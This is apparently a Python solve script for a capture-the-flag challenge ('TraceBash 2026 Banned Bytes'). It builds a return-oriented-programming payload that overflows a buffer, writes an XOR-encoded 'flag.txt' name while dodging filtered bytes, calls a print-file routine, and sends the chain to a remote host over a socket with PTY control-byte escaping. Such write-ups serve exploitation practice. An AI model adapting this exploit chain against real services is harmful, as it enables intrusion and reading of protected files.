#!/usr/bin/env python3
"""Solve TraceBash 2026 Banned Bytes.

The raw payload is safe for the binary's x/g/a/. filter. When talking to the
Docker wrapper, quote terminal control bytes because socat places the process
behind a PTY.
"""

import argparse
import socket
import struct
import sys
import time


def p64(value: int) -> bytes:
    return struct.pack("<Q", value)


POP_ALL = 0x40125B
POP_TWO = 0x401264
STORE_QWORD = 0x401269
XOR_BYTE = 0x40126E
POP_RDI = 0x401272
RET = 0x401274
PRINT_FILE = 0x401060
MAIN = 0x40124B
WRITEBUF = 0x404060


def build_payload() -> bytes:
    key = 2
    encoded_name = b"flce,tzt"
    payload = b"A" * 88

    payload += p64(POP_ALL)
    payload += p64(int.from_bytes(encoded_name, "little"))
    payload += p64(WRITEBUF)
    payload += p64(0)
    payload += p64(0)
    payload += p64(STORE_QWORD)

    for offset in (2, 3, 4, 6):
        payload += p64(POP_TWO)
        payload += p64(key)
        payload += p64(WRITEBUF + offset)
        payload += p64(XOR_BYTE)

    payload += p64(POP_RDI)
    payload += p64(WRITEBUF)
    payload += p64(RET)
    payload += p64(PRINT_FILE)
    payload += p64(MAIN)

    banned = set(b"xga.")
    if len(payload) != 304:
        raise ValueError(f"unexpected payload length: {len(payload)}")
    if any(byte in banned for byte in payload):
        raise ValueError("payload contains a filtered byte")
    return payload


def quote_for_pty(payload: bytes) -> bytes:
    wire = bytearray()
    for byte in payload:
        if byte < 0x20 or byte == 0x7F:
            wire.append(0x16)  # literal-next / Ctrl-V
        wire.append(byte)
    return bytes(wire)


def run_remote(host: str, port: int) -> bytes:
    wire = quote_for_pty(build_payload()) + b"\n"
    with socket.create_connection((host, port), timeout=10) as sock:
        sock.settimeout(2)
        output = bytearray()
        try:
            output.extend(sock.recv(4096))
        except TimeoutError:
            pass
        sock.sendall(wire)
        time.sleep(0.2)
        while True:
            try:
                chunk = sock.recv(4096)
            except TimeoutError:
                break
            if not chunk:
                break
            output.extend(chunk)
    return bytes(output)


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("host", nargs="?")
    parser.add_argument("port", nargs="?", type=int, default=1338)
    parser.add_argument("--payload", action="store_true")
    args = parser.parse_args()

    payload = build_payload()
    if args.payload:
        sys.stdout.buffer.write(payload + b"\n")
        return
    if args.host is None:
        parser.error("provide a host, or use --payload for a local pipe")
    sys.stdout.buffer.write(run_remote(args.host, args.port))


if __name__ == "__main__":
    main()
